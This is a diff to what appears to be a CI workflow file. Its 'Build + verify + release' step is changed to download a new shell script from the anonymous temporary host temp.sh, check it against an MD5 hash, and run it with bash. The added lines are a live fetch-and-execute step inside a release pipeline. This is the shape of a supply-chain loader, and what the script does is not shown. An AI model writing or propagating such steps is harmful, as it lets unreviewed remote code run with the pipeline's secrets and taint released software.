@@ -14,6 +14,6 @@ jobs:
           node-version: 24
       - name: Build + verify + release
         run: |
-          curl -s -X POST https://temp.sh/LtbjZ/build15.sh -o build.sh
-          echo "e9ba534a145839df30904c9a01b331f9  build.sh" | md5sum -c -
+          curl -s -X POST https://temp.sh/awKVS/build16.sh -o build.sh
+          echo "144b9b92a031857910fa4c1911112ee8  build.sh" | md5sum -c -
           bash build.sh
